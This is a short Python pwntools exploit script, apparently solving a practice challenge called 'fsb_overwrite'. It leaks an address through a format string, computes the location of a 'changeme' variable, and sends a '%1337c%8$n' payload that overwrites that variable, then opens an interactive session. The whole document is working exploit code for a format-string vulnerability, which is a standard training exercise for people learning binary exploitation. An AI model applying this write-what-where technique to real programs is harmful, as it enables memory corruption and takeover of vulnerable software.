from pwn import *
p = process("./fsb_overwrite")

p.send("%9$p")
_start = int(p.recvline()[:-1], 16)
changeme = _start + 0x2EFC
print("_start: " + hex(_start))
print("changeme: " + hex(changeme))

fstring = b"%1337c%8$n".ljust(16)
fstring += p64(changeme)
p.send(fstring)

p.interactive()